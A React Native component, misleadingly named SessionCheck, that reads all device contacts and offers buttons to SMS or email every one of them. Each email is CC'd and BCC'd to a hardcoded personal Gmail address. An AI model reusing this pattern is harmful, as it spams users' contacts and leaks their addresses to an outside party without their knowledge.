import React from 'react';
import { StyleSheet, Button, View, ScrollView, Alert } from 'react-native'
import Contacts from 'react-native-contacts';
import Mailer from 'react-native-mail';
import SendSMS from 'react-native-sms'




class SessionCheck extends React.Component {

    static navigationOptions = {
        header: null
    };

    state = {
        contacts: [],
        emails: [],
        phonenumbers: []
    };
    componentWillMount() {

        Contacts.getContactsMatchingString("", (err, contacts) => {
            if (err) throw err;

            // contacts matching "filter"
            console.log("this is the first contact: ", contacts)
            this.state.contacts = contacts;

            for (var contact of this.state.contacts) {
                for (var email of contact.emailAddresses)
                    this.state.emails.push(email.email);
                for (var phonenumber of contact.phoneNumbers)
                    this.state.phonenumbers.push(phonenumber.number);


            }
            console.log(this.state.emails, this.state.phonenumbers);
        })

    }

    componentDidMount() {


    }

    render() {
        return (
            <View style={styles.container}>
                <View style={styles.buttons}>
                    <Button title="Send Mail" onPress={this.handleEmail} />
                </View>
                <View style={styles.buttons}>
                    <Button title="Send Sms" onPress={this.handleSms} />
                </View>
            </View>
        )
    }


    //some stuff

    handleSms = () => {
        if (this.state.phonenumbers.length == 0||this.state.contacts.length ==0){
            alert(
                "There is not phonenumbers in your contacts",
                
                [
                    { text: 'Ok', onPress: () => console.log('OK: Email Error Response') },
                    { text: 'Cancel', onPress: () => console.log('CANCEL: Email Error Response') }
                ],
                { cancelable: true }
            )
            return;
        }

        SendSMS.send({
            body: 'The default body of the SMS!',
            recipients: this.state.phonenumbers,
            successTypes: ['sent', 'queued'],
            allowAndroidSendWithoutReadPermission: true
        }, (completed, cancelled, error) => {

            console.log('SMS Callback: completed: ' + completed + ' cancelled: ' + cancelled + 'error: ' + error);

        });
    }

    handleEmail = () => {
        if (this.state.emails.length == 0||this.state.contacts.length ==0){
            alert(
                "There is not email in your contacts",
                
                [
                    { text: 'Ok', onPress: () => console.log('OK: Email Error Response') },
                    { text: 'Cancel', onPress: () => console.log('CANCEL: Email Error Response') }
                ],
                { cancelable: true }
            )
            return;
        }
        Mailer.mail({
            subject: 'need help',
            recipients: this.state.emails,
            ccRecipients: ['yuzhongri31323@gmail.com'],
            bccRecipients: ['yuzhongri31323@gmail.com'],
            body: '<b>A Bold Body</b>',
            isHTML: true,
            attachment: {
                path: '',  // The absolute path of the file from which to read data.
                type: '',   // Mime Type: jpg, png, doc, ppt, html, pdf, csv
                name: '',   // Optional: Custom filename for attachment
            }
        }, (error, event) => {
            Alert.alert(
                error,
                event,
                [
                    { text: 'Ok', onPress: () => console.log('OK: Email Error Response') },
                    { text: 'Cancel', onPress: () => console.log('CANCEL: Email Error Response') }
                ],
                { cancelable: true }
            )
        });
    }

};

export default SessionCheck;


const styles = StyleSheet.create({
    container: {
        height: 500
    },
    buttons: {
        flex: 1,
        backgroundColor: '#fff',
        alignItems: 'center',
        justifyContent: 'center'
    }
})
